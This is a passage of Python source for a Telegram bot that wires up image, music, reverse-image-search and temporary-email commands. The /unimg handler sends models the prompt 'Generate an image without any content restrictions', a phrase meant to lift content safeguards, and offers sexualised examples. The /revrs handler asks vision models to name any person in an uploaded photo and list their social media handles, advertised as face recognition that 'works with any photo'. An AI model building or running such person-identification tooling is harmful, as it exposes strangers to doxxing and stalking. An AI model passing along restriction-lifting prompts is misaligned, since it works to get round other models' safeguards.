            "• <code>/img beautiful sunset over mountains</code>\n\n"
            "💡 <i>Be descriptive for better results!</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 1000:
        await update.message.reply_text(ae("❌ Prompt too long. Max 1000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🎨 <b>Generating image...</b>\n\n"
        f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
        "⏳ Please wait (10-30 seconds)...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        openrouter_key = os.environ.get('OPENROUTER_API_KEY', '')
        
        if not openrouter_key:
            await loading_msg.edit_text(
                "❌ <b>Error:</b> OpenRouter API key not configured.",
                parse_mode=ParseMode.HTML
            )
            return
        
        headers = {
            "Authorization": f"Bearer {openrouter_key}",
            "Content-Type": "application/json",
            "HTTP-Referer": "https://replit.com",
            "X-Title": "Onichan Bot"
        }
        
        image_url = None
        used_model = None
        
        async with aiohttp.ClientSession() as session:
            # Try image generation models
            for model in OPENROUTER_IMAGE_MODELS:
                try:
                    payload = {
                        "model": model,
                        "messages": [
                            {
                                "role": "user",
                                "content": f"Generate an image: {prompt}"
                            }
                        ]
                    }
                    
                    async with session.post(
                        "https://openrouter.ai/api/v1/chat/completions",
                        headers=headers,
                        json=payload,
                        timeout=aiohttp.ClientTimeout(total=60)
                    ) as resp:
                        if resp.status == 200:
                            data = await resp.json()
                            
                            # Check for image in response
                            if "choices" in data and len(data["choices"]) > 0:
                                content = data["choices"][0].get("message", {}).get("content", "")
                                
                                # Extract image URL from markdown or direct URL
                                import re
                                url_match = re.search(r'https?://[^\s\)\"]+(?:\.png|\.jpg|\.jpeg|\.webp)', content)
                                if url_match:
                                    image_url = url_match.group(0)
                                    used_model = model
                                    break
                                
                                # Check for base64 image
                                if "data:image" in content or "base64" in content:
                                    # Handle base64 separately
                                    pass
                            
                except Exception as model_error:
                    print(f"[IMG] Model {model} failed: {model_error}")
                    continue
            
            # Fallback: Use text-to-image via Pollinations (free backup)
            if not image_url:
                import urllib.parse
                encoded_prompt = urllib.parse.quote(prompt)
                image_url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width=1024&height=1024&nologo=true"
                used_model = "Pollinations AI"
        
        if image_url:
            await loading_msg.delete()
            
            caption = ae(f"""🎨 <b>Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_model}
👤 <b>By:</b> {user.first_name}""")
            
            try:
                await update.message.reply_photo(
                    photo=image_url,
                    caption=caption,
                    parse_mode=ParseMode.HTML
                )
            except Exception as img_error:
                # If sending photo fails, send URL
                await update.message.reply_text(
                    f"{caption}\n\n🔗 <a href=\"{image_url}\">View Image</a>",
                    parse_mode=ParseMode.HTML
                )
        else:
            await loading_msg.edit_text(
                "❌ <b>Failed to generate image.</b>\n\nPlease try a different prompt.",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# UNCENSORED IMAGE GENERATION - /unimg COMMAND
# ============================================================================

@require_approval
async def unimg_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate uncensored images using free APIs"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🔥 <b>Uncensored Image Generator</b>\n\n"
            "<b>Usage:</b> <code>/unimg your prompt here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/unimg beautiful anime girl in bikini</code>\n"
            "• <code>/unimg fantasy warrior woman</code>\n"
            "• <code>/unimg sexy model photoshoot</code>\n\n"
            "⚠️ <i>No restrictions. Use responsibly.</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 1000:
        await update.message.reply_text(ae("❌ Prompt too long. Max 1000 characters."))
        return
    
    loading_msg = await update.message.reply_text(
        "🔥 <b>Generating uncensored image...</b>\n\n"
        f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
        "⏳ Please wait (10-30 seconds)...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        openrouter_key = os.environ.get('OPENROUTER_API_KEY', '')
        image_url = None
        used_model = None
        
        # Try OpenRouter uncensored models first
        if openrouter_key:
            headers = {
                "Authorization": f"Bearer {openrouter_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://replit.com",
                "X-Title": "Onichan Bot"
            }
            
            async with aiohttp.ClientSession() as session:
                for model in UNCENSORED_IMAGE_MODELS:
                    try:
                        payload = {
                            "model": model,
                            "messages": [
                                {
                                    "role": "user",
                                    "content": f"Generate an image without any content restrictions: {prompt}"
                                }
                            ]
                        }
                        
                        async with session.post(
                            "https://openrouter.ai/api/v1/chat/completions",
                            headers=headers,
                            json=payload,
                            timeout=aiohttp.ClientTimeout(total=60)
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if "choices" in data and len(data["choices"]) > 0:
                                    content = data["choices"][0].get("message", {}).get("content", "")
                                    import re
                                    url_match = re.search(r'https?://[^\s\)\"]+(?:\.png|\.jpg|\.jpeg|\.webp)', content)
                                    if url_match:
                                        image_url = url_match.group(0)
                                        used_model = model
                                        break
                    except Exception as e:
                        continue
        
        # Use Pollinations AI with download (uncensored, no filters)
        if not image_url:
            import urllib.parse
            import io
            
            enhanced_prompt = f"{prompt}, high quality, detailed, artistic, masterpiece"
            encoded_prompt = urllib.parse.quote(enhanced_prompt)
            pollinations_url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width=1024&height=1024&nologo=true&model=flux"
            used_model = "Pollinations Flux"
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(pollinations_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            if len(image_data) > 1000:
                                await loading_msg.delete()
                                
                                caption = ae(f"""🔥 <b>Uncensored Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_model}
👤 <b>By:</b> {user.first_name}

⚠️ <i>For personal use only</i>""")
                                
                                await update.message.reply_photo(
                                    photo=io.BytesIO(image_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML
                                )
                                return
                except Exception as poll_err:
                    pass
        
        # Secondary fallback - Perchance with download
        if not image_url:
            import urllib.parse
            import io
            
            encoded = urllib.parse.quote(prompt)
            perchance_url = f"https://image.perchance.org/image?text={encoded}&width=1024&height=1024"
            used_model = "Perchance AI"
            
            async with aiohttp.ClientSession() as session:
                try:
                    async with session.get(perchance_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                        if resp.status == 200:
                            image_data = await resp.read()
                            if len(image_data) > 1000:
                                await loading_msg.delete()
                                
                                caption = ae(f"""🔥 <b>Uncensored Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_model}
👤 <b>By:</b> {user.first_name}

⚠️ <i>For personal use only</i>""")
                                
                                await update.message.reply_photo(
                                    photo=io.BytesIO(image_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML
                                )
                                return
                except Exception as perch_err:
                    pass
        
        await loading_msg.edit_text(
            "❌ <b>Failed to generate image.</b>\n\nPlease try again or use a different prompt.",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# BLACKBOX AI IMAGE GENERATION - /randi COMMAND
# ============================================================================

@require_approval
async def randi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate images using Blackbox AI API with Pollinations fallback"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🖤 <b>Blackbox AI Image Generator</b>\n\n"
            "<b>Usage:</b> <code>/randi your prompt here</code>\n\n"
            "<b>Examples:</b>\n"
            "• <code>/randi beautiful sunset over mountains</code>\n"
            "• <code>/randi anime girl with blue hair</code>\n"
            "• <code>/randi cyberpunk city at night</code>\n\n"
            "⏳ <i>Generation takes 10-30 seconds</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 1000:
        await update.message.reply_text(ae("❌ Prompt too long. Max 1000 characters."))
        return
    
    _loading_gif = get_sexy_anime_gif("loading")
    if _loading_gif:
        loading_msg = await update.message.reply_animation(
            animation=_loading_gif,
            caption=f"🖤 <b>Generating image...</b>\n\n📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n⏳ Please wait (10-30 seconds)...",
            parse_mode=ParseMode.HTML
        )
    else:
        loading_msg = await update.message.reply_text(
            "🖤 <b>Generating image...</b>\n\n"
            f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
            "⏳ Please wait (10-30 seconds)...",
            parse_mode=ParseMode.HTML
        )
    
    try:
        import io
        import urllib.parse
        
        async with aiohttp.ClientSession() as session:
            # Use Pollinations AI (reliable, no API key needed, uncensored)
            enhanced_prompt = f"{prompt}, high quality, detailed, 8k, masterpiece"
            encoded_prompt = urllib.parse.quote(enhanced_prompt)
            pollinations_url = f"https://image.pollinations.ai/prompt/{encoded_prompt}?width=1024&height=1024&nologo=true&model=flux"
            
            try:
                async with session.get(pollinations_url, timeout=aiohttp.ClientTimeout(total=120)) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if len(image_data) > 1000:
                            await loading_msg.delete()
                            
                            caption = f"""🖤 <b>Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> Flux AI (Uncensored)
👤 <b>By:</b> {user.first_name}"""
                            
                            await update.message.reply_photo(
                                photo=io.BytesIO(image_data),
                                caption=caption,
                                parse_mode=ParseMode.HTML
                            )
                            return
            except Exception as poll_err:
                pass
            
            # Fallback to Perchance
            try:
                encoded = urllib.parse.quote(prompt)
                perchance_url = f"https://image.perchance.org/image?text={encoded}&width=1024&height=1024"
                
                async with session.get(perchance_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        if len(image_data) > 1000:
                            await loading_msg.delete()
                            
                            caption = f"""🖤 <b>Image Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> Perchance AI
👤 <b>By:</b> {user.first_name}"""
                            
                            await update.message.reply_photo(
                                photo=io.BytesIO(image_data),
                                caption=caption,
                                parse_mode=ParseMode.HTML
                            )
                            return
            except Exception as perch_err:
                pass
        
        await loading_msg.edit_text(
            "❌ <b>Failed to generate image.</b>\n\nPlease try again with a different prompt.",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# AI MUSIC GENERATION - /music COMMAND
# ============================================================================

@require_approval
async def music_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate music using AI APIs"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "🎵 <b>AI Music Generator</b>\n\n"
            "⚠️ <b>Note:</b> Free music AI is slow (1-3 min)\n\n"
            "<b>Usage:</b> <code>/music lofi beats</code>\n\n"
            "<b>Tips for faster results:</b>\n"
            "• Keep prompts SHORT (2-4 words)\n"
            "• Simple genres work best\n\n"
            "🎧 <i>Uses Meta's MusicGen AI</i>",
            parse_mode=ParseMode.HTML
        )
        return
    
    prompt = ' '.join(context.args)
    
    if len(prompt) > 500:
        await update.message.reply_text(ae("❌ Prompt too long. Max 500 characters."))
        return
    
    _loading_gif = get_sexy_anime_gif("loading")
    if _loading_gif:
        loading_msg = await update.message.reply_animation(
            animation=_loading_gif,
            caption=f"🎵 <b>Generating music...</b>\n\n📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n⏳ Please wait 1-3 minutes...\n🎧 Loading AI model and composing...\n\n<i>Free AI is slow. First request may take longer.</i>",
            parse_mode=ParseMode.HTML
        )
    else:
        loading_msg = await update.message.reply_text(
            "🎵 <b>Generating music...</b>\n\n"
            f"📝 <b>Prompt:</b> {html_escape(prompt[:100])}{'...' if len(prompt) > 100 else ''}\n\n"
            "⏳ Please wait 1-3 minutes...\n"
            "🎧 Loading AI model and composing...\n\n"
            "<i>Free AI is slow. First request may take longer.</i>",
            parse_mode=ParseMode.HTML
        )
    
    try:
        import io
        
        async with aiohttp.ClientSession() as session:
            # Try Hugging Face MusicGen API (free, public inference)
            try:
                hf_url = "https://api-inference.huggingface.co/models/facebook/musicgen-small"
                headers = {
                    "Content-Type": "application/json"
                }
                payload = {"inputs": prompt, "wait_for_model": True}
                
                async with session.post(
                    hf_url,
                    headers=headers,
                    json=payload,
                    timeout=aiohttp.ClientTimeout(total=180)
                ) as resp:
                    if resp.status == 200:
                        content_type = resp.headers.get('content-type', '')
                        if 'audio' in content_type or 'octet-stream' in content_type:
                            audio_data = await resp.read()
                            if len(audio_data) > 5000:
                                await loading_msg.delete()
                                
                                caption = f"""🎵 <b>Music Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> MusicGen (Meta AI)
👤 <b>By:</b> {user.first_name}

🎧 <i>Enjoy your AI-generated music!</i>"""
                                
                                await update.message.reply_audio(
                                    audio=io.BytesIO(audio_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML,
                                    filename=f"music_{user.id}.flac",
                                    title=prompt[:50]
                                )
                                return
                    elif resp.status == 503:
                        # Model loading, wait and retry
                        await loading_msg.edit_text(
                            "🎵 <b>Loading AI model...</b>\n\n"
                            "⏳ First request takes longer. Please wait...",
                            parse_mode=ParseMode.HTML
                        )
                        await asyncio.sleep(20)
                        
                        async with session.post(
                            hf_url,
                            headers=headers,
                            json=payload,
                            timeout=aiohttp.ClientTimeout(total=180)
                        ) as retry_resp:
                            if retry_resp.status == 200:
                                audio_data = await retry_resp.read()
                                if len(audio_data) > 5000:
                                    await loading_msg.delete()
                                    
                                    caption = f"""🎵 <b>Music Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> MusicGen (Meta AI)
👤 <b>By:</b> {user.first_name}

🎧 <i>Enjoy your AI-generated music!</i>"""
                                    
                                    await update.message.reply_audio(
                                        audio=io.BytesIO(audio_data),
                                        caption=caption,
                                        parse_mode=ParseMode.HTML,
                                        filename=f"music_{user.id}.flac",
                                        title=prompt[:50]
                                    )
                                    return
            except asyncio.TimeoutError:
                pass
            except Exception as hf_err:
                pass
            
            audio_url = None
            used_api = None
            
            # If we got a URL, download and send
            if audio_url:
                try:
                    async with session.get(audio_url, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                        if resp.status == 200:
                            audio_data = await resp.read()
                            if len(audio_data) > 1000:
                                await loading_msg.delete()
                                
                                import io
                                caption = f"""🎵 <b>Music Generated!</b>

📝 <b>Prompt:</b> {html_escape(prompt[:200])}{'...' if len(prompt) > 200 else ''}

🤖 <b>Model:</b> {used_api}
👤 <b>By:</b> {user.first_name}

🎧 <i>Enjoy your AI-generated music!</i>"""
                                
                                await update.message.reply_audio(
                                    audio=io.BytesIO(audio_data),
                                    caption=caption,
                                    parse_mode=ParseMode.HTML,
                                    filename=f"music_{user.id}.mp3",
                                    title=prompt[:50]
                                )
                                return
                except Exception as dl_err:
                    pass
        
        # All APIs failed
        await loading_msg.edit_text(
            "❌ <b>Music generation temporarily unavailable.</b>\n\n"
            "The AI model is currently loading or busy.\n\n"
            "<b>Try:</b>\n"
            "• Wait 30 seconds and try again\n"
            "• Use shorter prompts: <code>lofi beats</code>\n"
            "• Try: <code>jazz piano</code>, <code>electronic</code>",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# REVERSE IMAGE SEARCH - /revrs
# ============================================================================

GEMINI_VISION_MODELS = [
    "gemini-2.0-flash",
    "gemini-2.0-flash-lite", 
    "gemini-1.5-flash",
    "gemini-1.5-flash-8b"
]

OPENROUTER_VISION_MODELS = [
    "meta-llama/llama-4-maverick:free",
    "qwen/qwen2.5-vl-72b-instruct:free",
    "mistralai/mistral-small-3.1-24b-instruct:free"
]

async def identify_person_from_image(image_data: bytes, mime_type: str = "image/jpeg") -> dict:
    """Use AI Vision to identify person - tries Gemini then OpenRouter"""
    import base64
    
    gemini_key = os.environ.get('GEMINI_API_KEY', '')
    openrouter_key = os.environ.get('OPENROUTER_API_KEY', '')
    
    if not gemini_key and not openrouter_key:
        return {"success": False, "error": "No API key configured"}
    
    if not image_data:
        return {"success": False, "error": "No image data provided"}
    
    image_base64 = base64.b64encode(image_data).decode('utf-8')
    
    prompt = """Analyze this image and identify the person(s) in it.
If you recognize who they are, provide:

👤 Name: [Full name]
💼 Role: [Profession/Who they are]
📱 Social Media:
   • Twitter/X: @handle
   • Instagram: @handle
   • Other platforms if known

📝 Brief description of the person.

If you cannot identify the specific person, describe what you see in the image.
Be concise and direct."""

    last_error = None
    
    # Try Gemini first
    if gemini_key:
        try:
            payload = {
                "contents": [{
                    "parts": [
                        {"text": prompt},
                        {"inline_data": {"mime_type": mime_type, "data": image_base64}}
                    ]
                }],
                "generationConfig": {"temperature": 0.2, "maxOutputTokens": 1000}
            }
            
            async with aiohttp.ClientSession() as session:
                for model in GEMINI_VISION_MODELS:
                    try:
                        url = f"https://generativelanguage.googleapis.com/v1beta/models/{model}:generateContent?key={gemini_key}"
                        async with session.post(url, json=payload, timeout=aiohttp.ClientTimeout(total=60)) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if 'candidates' in data and data['candidates']:
                                    text = data['candidates'][0].get('content', {}).get('parts', [{}])[0].get('text', '')
                                    if text:
                                        return {"success": True, "identification": text}
                            elif resp.status == 429:
                                continue
                            else:
                                continue
                    except:
                        continue
        except:
            pass
    
    # Fallback to OpenRouter vision models
    if openrouter_key:
        try:
            headers = {
                "Authorization": f"Bearer {openrouter_key}",
                "Content-Type": "application/json",
                "HTTP-Referer": "https://t.me/onichanbot"
            }
            
            async with aiohttp.ClientSession() as session:
                for model in OPENROUTER_VISION_MODELS:
                    try:
                        payload = {
                            "model": model,
                            "messages": [{
                                "role": "user",
                                "content": [
                                    {"type": "text", "text": prompt},
                                    {"type": "image_url", "image_url": {"url": f"data:{mime_type};base64,{image_base64}"}}
                                ]
                            }],
                            "max_tokens": 1000
                        }
                        
                        async with session.post(
                            "https://openrouter.ai/api/v1/chat/completions",
                            headers=headers, json=payload,
                            timeout=aiohttp.ClientTimeout(total=60)
                        ) as resp:
                            if resp.status == 200:
                                data = await resp.json()
                                if 'choices' in data and data['choices']:
                                    text = data['choices'][0].get('message', {}).get('content', '')
                                    if text:
                                        return {"success": True, "identification": text}
                            elif resp.status == 429:
                                continue
                    except:
                        continue
        except:
            pass
    
    return {"success": False, "error": "All AI models are busy. Please try again in a minute."}

async def reverse_image_search(image_url: str) -> dict:
    """Perform reverse image search using multiple free engines"""
    results = {
        "google_lens": None,
        "yandex": None,
        "tineye": None,
        "similar_images": [],
        "possible_sources": [],
        "face_matches": []
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            # TinEye API (free tier)
            try:
                tineye_url = f"https://tineye.com/api/v1/result_json/?url={image_url}"
                async with session.get(tineye_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        results["tineye"] = {
                            "matches": data.get("count", 0),
                            "results": data.get("results", [])[:5]
                        }
            except:
                pass
            
            # Google Lens search URL
            results["google_lens"] = f"https://lens.google.com/uploadbyurl?url={image_url}"
            
            # Yandex Images search URL
            results["yandex"] = f"https://yandex.com/images/search?rpt=imageview&url={image_url}"
            
            # SauceNAO for anime/artwork
            try:
                saucenao_url = f"https://saucenao.com/search.php?url={image_url}&output_type=2"
                async with session.get(saucenao_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                    if resp.status == 200:
                        data = await resp.json()
                        if "results" in data:
                            for r in data["results"][:3]:
                                results["similar_images"].append({
                                    "title": r.get("header", {}).get("index_name", "Unknown"),
                                    "similarity": r.get("header", {}).get("similarity", "0"),
                                    "url": r.get("data", {}).get("ext_urls", [""])[0] if r.get("data", {}).get("ext_urls") else ""
                                })
            except:
                pass
            
            # PimEyes alternative - face search hint
            results["pimeyes"] = f"https://pimeyes.com/en"
            
        return {"success": True, "results": results}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

@require_approval
async def reverse_search_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Reverse image search - find similar images and faces"""
    user = update.effective_user
    
    image_data = None
    mime_type = "image/jpeg"
    image_url = None
    
    # Check if replying to a photo
    if update.message.reply_to_message and update.message.reply_to_message.photo:
        photo = update.message.reply_to_message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        image_data = await file.download_as_bytearray()
        image_url = file.file_path
    
    # Check if photo attached to message
    elif update.message.photo:
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        image_data = await file.download_as_bytearray()
        image_url = file.file_path
    
    # Check if URL provided
    elif context.args:
        image_url = context.args[0]
        # Download from URL
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(image_url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
                    if resp.status == 200:
                        image_data = await resp.read()
                        content_type = resp.headers.get('Content-Type', 'image/jpeg')
                        if 'png' in content_type:
                            mime_type = "image/png"
                        elif 'webp' in content_type:
                            mime_type = "image/webp"
        except:
            pass
    
    if not image_data:
        await update.message.reply_text(
            "🔍 <b>Reverse Image Search</b>\n\n"
            "<b>Usage:</b>\n"
            "• Reply to an image with <code>/revrs</code>\n"
            "• <code>/revrs [image_url]</code>\n"
            "• Send image with <code>/revrs</code> caption\n\n"
            "<b>Features:</b>\n"
            "• Identify people in images\n"
            "• Show social media profiles\n"
            "• Face recognition\n"
            "• Works with any photo!",
            parse_mode=ParseMode.HTML
        )
        return
    
    loading_msg = await update.message.reply_text(
        "🔍 <b>Analyzing image...</b>\n\n"
        "🤖 AI is identifying the person...",
        parse_mode=ParseMode.HTML
    )
    
    try:
        # Identify the person using AI vision
        person_result = await identify_person_from_image(bytes(image_data), mime_type)
        
        if person_result["success"]:
            identification = sanitize_ai_response(person_result["identification"])
            
            # Truncate if too long
            if len(identification) > 2500:
                identification = identification[:2500] + "..."
            
            response_text = f"""🔍 <b>Image Analysis Results</b>

👤 <b>Person Identification:</b>

{identification}

━━━━━━━━━━━━━━━━━━━━━━

<i>🤖 Powered by AI Vision</i>"""
            
            await loading_msg.edit_text(
                response_text,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True
            )
        else:
            # Show error with details
            error_msg = person_result.get('error', 'Unknown error')
            await loading_msg.edit_text(
                f"❌ <b>Could not analyze image</b>\n\n"
                f"<b>Error:</b> {html_escape(str(error_msg)[:200])}\n\n"
                f"<i>Make sure image is clear and try again.</i>",
                parse_mode=ParseMode.HTML
            )
    
    except Exception as e:
        await loading_msg.edit_text(
            f"❌ <b>Error:</b> {str(e)[:200]}",
            parse_mode=ParseMode.HTML
        )

# ============================================================================
# TEMP MAIL GENERATOR
# ============================================================================

import hashlib
import string as string_module

TEMPMAIL_BASE_URL = "https://api.mail.tm"
TEMPMAIL_HEADERS = {
    "Content-Type": "application/json",
    "Accept": "application/json"
}

tempmail_token_map = {}
tempmail_user_tokens = {}
tempmail_user_emails = {}
tempmail_seen_messages = {}
tempmail_polling_active = {}

def tempmail_short_id(email):
    import time as t
    unique_string = email + str(t.time())
    return hashlib.md5(unique_string.encode()).hexdigest()[:10]

def tempmail_random_username(length=8):
    return ''.join(random.choice(string_module.ascii_lowercase) for _ in range(length))

def tempmail_random_password(length=12):
    chars = string_module.ascii_letters + string_module.digits
    return ''.join(random.choice(chars) for _ in range(length))

def tempmail_get_domain():
    try:
        response = requests.get(f"{TEMPMAIL_BASE_URL}/domains", headers=TEMPMAIL_HEADERS, timeout=10)
        data = response.json()
        if isinstance(data, list) and data:
            return data[0]['domain']
        elif 'hydra:member' in data and data['hydra:member']:
            return data['hydra:member'][0]['domain']
    except:
        pass
    return None

def tempmail_create_account(email, password):
    try:
        data = {"address": email, "password": password}
        response = requests.post(f"{TEMPMAIL_BASE_URL}/accounts", headers=TEMPMAIL_HEADERS, json=data, timeout=10)
        if response.status_code in [200, 201]:
            return response.json()
    except:
        pass
    return None

def tempmail_get_token(email, password):
    try:
        data = {"address": email, "password": password}
        response = requests.post(f"{TEMPMAIL_BASE_URL}/token", headers=TEMPMAIL_HEADERS, json=data, timeout=10)
        if response.status_code == 200:
            return response.json().get('token')
    except:
        pass
    return None

def tempmail_list_messages(token):
    try:
        headers = {**TEMPMAIL_HEADERS, "Authorization": f"Bearer {token}"}
        response = requests.get(f"{TEMPMAIL_BASE_URL}/messages", headers=headers, timeout=10)
        data = response.json()
        if isinstance(data, list):
            return data
        elif 'hydra:member' in data:
            return data['hydra:member']
    except:
        pass
    return []

def tempmail_get_message(token, message_id):
    try:
        headers = {**TEMPMAIL_HEADERS, "Authorization": f"Bearer {token}"}
        response = requests.get(f"{TEMPMAIL_BASE_URL}/messages/{message_id}", headers=headers, timeout=10)
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return None

def tempmail_html_to_text(html_content):
    from bs4 import BeautifulSoup
    if isinstance(html_content, list):
        html_content = ''.join(html_content)
    soup = BeautifulSoup(html_content, 'html.parser')
    for a_tag in soup.find_all('a', href=True):
        url = a_tag['href']
        a_tag.string = f"{a_tag.text} [{url}]"
    text = soup.get_text()
    import re
    return re.sub(r'\s+', ' ', text).strip()

async def tempmail_poll_inbox(bot, user_id, token, email):
    """Background task to poll for new emails and notify user"""
    import asyncio
    
    tempmail_polling_active[user_id] = True
    tempmail_seen_messages[user_id] = set()
    
    initial_messages = tempmail_list_messages(token)
    for msg in initial_messages:
        tempmail_seen_messages[user_id].add(msg.get('id'))
    
    poll_count = 0
    max_polls = 180
    
    while poll_count < max_polls and tempmail_polling_active.get(user_id):
        try:
            await asyncio.sleep(10)
            poll_count += 1
            
            messages = tempmail_list_messages(token)
            if not messages:
                continue
            
            for msg in messages:
                msg_id = msg.get('id')
                if msg_id and msg_id not in tempmail_seen_messages.get(user_id, set()):
                    tempmail_seen_messages[user_id].add(msg_id)
                    
                    from_addr = msg.get('from', {}).get('address', 'Unknown')
                    subject = msg.get('subject', 'No Subject')[:50]
                    
                    details = tempmail_get_message(token, msg_id)
                    content_preview = ""
                    if details:
                        if 'html' in details and details['html']:
                            content_preview = tempmail_html_to_text(details['html'])[:500]
                        elif 'text' in details:
                            content_preview = details['text'][:500]
                    
                    notification = f"""📬 <b>New Email Received!</b>
━━━━━━━━━━━━━━━━━━

📧 <b>To:</b> <code>{email}</code>
📤 <b>From:</b> <code>{from_addr}</code>
📋 <b>Subject:</b> {subject}

━━━━━━━━━━━━━━━━━━

{content_preview}{'...' if len(content_preview) >= 500 else ''}"""
                    
                    try:
                        await bot.send_message(chat_id=user_id, text=notification, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                    except Exception as e:
                        print(f"Failed to notify user {user_id}: {e}")
                        
        except Exception as e:
            print(f"Polling error for user {user_id}: {e}")
            await asyncio.sleep(30)
    
    tempmail_polling_active[user_id] = False

@require_approval
async def tempmail_generate(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate temporary email"""
    import asyncio
    import time as time_mod
    user = update.effective_user
    chat_type = update.effective_chat.type
    
    loading_msg = await update.message.reply_text("📧 Generating temporary email...")
    
    try:
        loop = asyncio.get_running_loop()
        
        args_text = ' '.join(context.args) if context.args else ""
        if ':' in args_text:
            parts = args_text.split(':')
            username = parts[0].strip()
            password = parts[1].strip() if len(parts) > 1 else tempmail_random_password()
        else:
            username = tempmail_random_username()
            password = tempmail_random_password()
        
        domain = await loop.run_in_executor(None, tempmail_get_domain)
        if not domain:
            await loading_msg.edit_text(ae("❌ Failed to get mail domain. Try again."))
            return
        
        email = f"{username}@{domain}"
        
        account = await loop.run_in_executor(None, tempmail_create_account, email, password)
        if not account:
            await loading_msg.edit_text(ae("❌ Username already taken. Choose another one."))
            return
        
        await asyncio.sleep(2)
        
        token = await loop.run_in_executor(None, tempmail_get_token, email, password)
        if not token:
            await loading_msg.edit_text(ae("❌ Failed to get token. Try again."))
            return
        
        short_id = tempmail_short_id(email)
        tempmail_token_map[short_id] = token
        tempmail_user_tokens[user.id] = token
        tempmail_user_emails[user.id] = email
        
        tempmail_polling_active[user.id] = False
        asyncio.create_task(tempmail_poll_inbox(context.bot, user.id, token, email))
        
        message = f"""✅ 𝗧𝗲𝗺𝗽 𝗠𝗮𝗶𝗹 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱

📧 𝗘𝗺𝗮𝗶𝗹: <code>{email}</code>

📬 Auto-notifications enabled (30 min)
💡 New emails will be sent to you instantly!
📥 Use /cmail to manually check inbox

𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 @{user.username or user.first_name}"""
        
        await loading_msg.edit_text(message, parse_mode=ParseMode.HTML)
        
    except Exception as e:
